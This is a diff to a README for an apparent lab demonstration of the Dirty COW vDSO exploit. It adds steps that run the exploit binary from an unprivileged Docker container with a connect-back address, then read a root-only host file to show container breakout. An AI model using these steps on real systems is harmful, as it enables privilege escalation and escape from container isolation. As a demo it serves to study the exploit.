@@ -7,10 +7,14 @@ To execute:
 	vagrant up
 	vagrant putty
 	cd /home/vagrant/vDSO-exploit && sudo docker run -it -p 1234:1234 ubuntu-dirtycow /bin/sh
+
+	note that we are a regular user inside the docker container (user: hacker)
+
 	/tmp/foo/0xdeadbeef 172.17.0.2:1234
 
 Wait a few minutes for the exploit to launch 
-Show the breakout
+
+Show the breakout of the container by catting the root file on the host OS:
 	cat /root/this_is_the_host
 	
   
